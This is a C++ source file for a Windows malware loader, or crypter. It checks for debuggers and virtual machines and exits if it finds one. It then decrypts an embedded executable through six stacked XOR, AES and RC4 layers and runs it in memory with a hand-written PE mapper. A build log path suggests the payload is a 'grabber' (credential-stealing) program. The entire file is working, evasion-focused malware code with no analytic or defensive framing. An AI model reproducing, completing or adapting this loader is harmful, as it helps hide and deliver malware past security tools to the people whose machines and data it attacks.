
#include "payload_data.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <winnt.h>
#include <intrin.h>
#include <cstdint>
#include <cstring>
#include <cstdarg>
#include <cstdio>
#include <vector>
#pragma comment(lib, "bcrypt.lib")

#ifndef BENCH
#define BENCH 0
#endif
static bool is_sandbox() {
#if BENCH
    return false;
#else
    if (IsDebuggerPresent()) return true;
    int r[4]{}; __cpuid(r, 0x40000000);
    char brand[13]{};
    memcpy(brand,   &r[1], 4);
    memcpy(brand+4, &r[2], 4);
    memcpy(brand+8, &r[3], 4);
    const char* sigs[] = {"VMwareVMware","KVMKVMKVM\0\0\0","VBoxVBoxVBox",
                          "XenVMMXenVMM","TCGTCGTCGTCG", nullptr};
    for (int i = 0; sigs[i]; i++)
        if (memcmp(brand, sigs[i], 12) == 0) return true;
    SYSTEM_INFO si{}; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    if (GetTickCount64() < 300000ULL) return true;
    return false;
#endif
}

static void xor_dec(uint8_t* buf, size_t len, const uint8_t* key, size_t klen) {
    for (size_t i = 0; i < len; ++i) buf[i] ^= key[i % klen];
}

static void rc4_dec(uint8_t* buf, size_t len, const uint8_t* key, size_t klen) {
    uint8_t S[256]; for (int i = 0; i < 256; ++i) S[i] = (uint8_t)i;
    uint8_t j = 0;
    for (int i = 0; i < 256; ++i) {
        j = j + S[i] + key[i % klen];
        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
    }
    uint8_t ii = 0, jj = 0;
    for (size_t n = 0; n < len; ++n) {
        ii++; jj += S[ii];
        uint8_t t = S[ii]; S[ii] = S[jj]; S[jj] = t;
        buf[n] ^= S[(S[ii] + S[jj]) & 0xFF];
    }
}

static std::vector<uint8_t> aes_cbc_dec(
        const uint8_t* data, size_t len,
        const uint8_t* key,
        const uint8_t* iv_in)
{
    BCRYPT_ALG_HANDLE hAlg  = nullptr;
    BCRYPT_KEY_HANDLE hKey  = nullptr;
    ULONG             cbObj = 0, cbData = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      (ULONG)(sizeof(BCRYPT_CHAIN_MODE_CBC)), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj, sizeof(cbObj), &cbData, 0);

    std::vector<uint8_t> keyObj(cbObj);
    BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), cbObj, (PUCHAR)key, 32, 0);

    uint8_t iv[16]; memcpy(iv, iv_in, 16);

    ULONG outLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
                  iv, 16, nullptr, 0, &outLen, BCRYPT_BLOCK_PADDING);
    std::vector<uint8_t> out(outLen);
    BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr,
                  iv, 16, out.data(), outLen, &outLen, BCRYPT_BLOCK_PADDING);
    out.resize(outLen);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

static DWORD  s_tlsIndex   = (DWORD)-1;
static uint8_t* s_tlsBlock = nullptr;
static PIMAGE_TLS_CALLBACK* s_tlsCallbacks = nullptr;

static void tls_setup(const IMAGE_NT_HEADERS* nt, uint8_t* base) {
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!dir.Size || !dir.VirtualAddress) return;
    auto* tls = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(base + dir.VirtualAddress);
    if (!tls->AddressOfIndex) return;

    const size_t rawSize = tls->EndAddressOfRawData > tls->StartAddressOfRawData
        ? (size_t)(tls->EndAddressOfRawData - tls->StartAddressOfRawData) : 0;
    const size_t total = rawSize + (size_t)tls->SizeOfZeroFill;

    s_tlsIndex = TlsAlloc();
    if (s_tlsIndex == TLS_OUT_OF_INDEXES) return;
    *reinterpret_cast<DWORD*>(tls->AddressOfIndex) = s_tlsIndex;

    if (total) {
        s_tlsBlock = reinterpret_cast<uint8_t*>(
            VirtualAlloc(nullptr, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (s_tlsBlock) {
            memset(s_tlsBlock, 0, total);
            if (rawSize) memcpy(s_tlsBlock,
                                reinterpret_cast<void*>(tls->StartAddressOfRawData),
                                rawSize);
        }
    }
    if (tls->AddressOfCallBacks)
        s_tlsCallbacks = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tls->AddressOfCallBacks);
}

struct PayloadStart {
    LPTHREAD_START_ROUTINE ep;
    uint8_t* base;
};
static DWORD WINAPI payload_thread(LPVOID param) {
    auto* s = reinterpret_cast<PayloadStart*>(param);
    if (s_tlsIndex != (DWORD)-1 && s_tlsBlock)
        TlsSetValue(s_tlsIndex, s_tlsBlock);
    if (s_tlsCallbacks)
        for (size_t i = 0; s_tlsCallbacks[i]; ++i)
            s_tlsCallbacks[i](s->base, DLL_PROCESS_ATTACH, nullptr);
    return s->ep(s->base);
}

static bool run_pe(const uint8_t* pe_buf, size_t ) {
#if BENCH
    FILE* lg = fopen("C:\\Users\\username\\Desktop\\grabber\\build\\runpe.log", "w");
    auto trace = [&](const char* fmt, ...) {
        if (!lg) return;
        va_list a; va_start(a, fmt); vfprintf(lg, fmt, a); va_end(a);
        fprintf(lg, "\n"); fflush(lg);
    };
#else
    auto trace = [](const char*, ...) {};
#endif
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe_buf);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { trace("bad dos"); return false; }
    auto* nt  = reinterpret_cast<const IMAGE_NT_HEADERS*>(pe_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)  { trace("bad nt"); return false; }

    const auto& opt = nt->OptionalHeader;
    SIZE_T imgSize  = opt.SizeOfImage;
    trace("ep=%x img=%zu sections=%u relocSize=%u impSize=%u",
          opt.AddressOfEntryPoint, (size_t)imgSize, nt->FileHeader.NumberOfSections,
          opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,
          opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

    uint8_t* base = reinterpret_cast<uint8_t*>(
        VirtualAlloc(reinterpret_cast<LPVOID>(opt.ImageBase),
                     imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!base)
        base = reinterpret_cast<uint8_t*>(
            VirtualAlloc(nullptr, imgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!base) { trace("alloc failed"); return false; }
    trace("base=%p preferred=%p delta=%llx", (void*)base,
          (void*)opt.ImageBase,
          (unsigned long long)(reinterpret_cast<ULONGLONG>(base) - opt.ImageBase));

    memcpy(base, pe_buf, opt.SizeOfHeaders);

    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->VirtualAddress + sec->SizeOfRawData > imgSize) {
            trace("section %u out of bounds (va=%x raw=%x)", i,
                  sec->VirtualAddress, sec->SizeOfRawData);
#if BENCH
            if (lg) fclose(lg);
#endif
            return false;
        }
        memcpy(base + sec->VirtualAddress,
               pe_buf + sec->PointerToRawData,
               sec->SizeOfRawData);
    }
    trace("sections copied");

    ULONGLONG delta = reinterpret_cast<ULONGLONG>(base) - opt.ImageBase;
    if (delta && opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        const auto& dir = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        auto* rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            base + dir.VirtualAddress);
        uint8_t* relEnd = base + dir.VirtualAddress + dir.Size;
        while (reinterpret_cast<uint8_t*>(rel) + sizeof(IMAGE_BASE_RELOCATION) <= relEnd
               && rel->VirtualAddress && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)
               && reinterpret_cast<uint8_t*>(rel) + rel->SizeOfBlock <= relEnd) {
            DWORD  count   = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            WORD*  entries = reinterpret_cast<WORD*>(rel + 1);
            for (DWORD j = 0; j < count; ++j) {
                if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto* patch = reinterpret_cast<ULONGLONG*>(
                        base + rel->VirtualAddress + (entries[j] & 0xFFF));
                    *patch += delta;
                }
            }
            rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<uint8_t*>(rel) + rel->SizeOfBlock);
        }
    }

    if (opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        auto* imp = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            base + opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; ++imp) {
            const char* dllName = reinterpret_cast<const char*>(base + imp->Name);
            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) { trace("LoadLibrary failed: %s", dllName); continue; }

            auto* thunk    = reinterpret_cast<IMAGE_THUNK_DATA*>(base + imp->FirstThunk);
            auto* origThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));

            for (; origThunk->u1.AddressOfData; ++thunk, ++origThunk) {
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(hDll, MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk->u1.Ordinal))));
                    if (!thunk->u1.Function)
                        trace("unresolved: %s!ordinal %u", dllName,
                              (unsigned)IMAGE_ORDINAL(origThunk->u1.Ordinal));
                } else {
                    auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        base + origThunk->u1.AddressOfData);
                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(
                        GetProcAddress(hDll, ibn->Name));
                    if (!thunk->u1.Function)
                        trace("unresolved: %s!%s", dllName, ibn->Name);
                }
            }
        }
    }
    trace("imports done");

    {
        const auto& pd = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (pd.Size) {
            DWORD entries = pd.Size / 12;
            BOOLEAN ok = RtlAddFunctionTable(
                reinterpret_cast<PRUNTIME_FUNCTION>(base + pd.VirtualAddress),
                entries, reinterpret_cast<DWORD64>(base));
            trace("RtlAddFunctionTable(%u entries)=%d", entries, (int)ok);
        }
    }

#if BENCH
    AddVectoredExceptionHandler(1, [](PEXCEPTION_POINTERS xi) -> LONG {
        FILE* lg = fopen("C:\\Users\\username\\Desktop\\grabber\\build\\runpe.log", "a");
        if (lg) {
            char mod[MAX_PATH] = "?";
            HMODULE hm = nullptr;
            if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                    reinterpret_cast<LPCSTR>(xi->ExceptionRecord->ExceptionAddress), &hm))
                GetModuleFileNameA(hm, mod, MAX_PATH);
            fprintf(lg, "EXCEPTION code=%08X addr=%p mod=%s\n",
                    xi->ExceptionRecord->ExceptionCode,
                    xi->ExceptionRecord->ExceptionAddress, mod);
            fclose(lg);
        }
        return EXCEPTION_CONTINUE_SEARCH;
    });
#endif

    tls_setup(nt, base);
    trace("tls index=%ld block=%p callbacks=%p", (long)s_tlsIndex,
          (void*)s_tlsBlock, (void*)s_tlsCallbacks);

    PayloadStart start{ reinterpret_cast<LPTHREAD_START_ROUTINE>(base + opt.AddressOfEntryPoint), base };
    HANDLE hThread = CreateThread(nullptr, 0, payload_thread, &start, 0, nullptr);
    trace("thread=%p ep=%p", (void*)hThread, (void*)(base + opt.AddressOfEntryPoint));
    if (hThread) WaitForSingleObject(hThread, INFINITE);
    trace("thread joined, rc ok=%d", hThread != nullptr);
    if (s_tlsIndex != (DWORD)-1) { TlsFree(s_tlsIndex); s_tlsIndex = (DWORD)-1; }
#if BENCH
    if (lg) fclose(lg);
#endif
    return hThread != nullptr;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (is_sandbox()) return 0;


    std::vector<uint8_t> buf(ENC_PAYLOAD, ENC_PAYLOAD + ENC_PAYLOAD_SIZE);

    xor_dec(buf.data(), buf.size(), K6, K6_SIZE);

    buf = aes_cbc_dec(buf.data(), buf.size(), K5, IV5);

    xor_dec(buf.data(), buf.size(), K4, K4_SIZE);

    rc4_dec(buf.data(), buf.size(), K3, K3_SIZE);

    buf = aes_cbc_dec(buf.data(), buf.size(), K2, IV2);

    xor_dec(buf.data(), buf.size(), K1, K1_SIZE);

    if (buf.size() < 2 || buf[0] != 'M' || buf[1] != 'Z') return 1;

    run_pe(buf.data(), buf.size());

    SecureZeroMemory(buf.data(), buf.size());
    return 0;
}
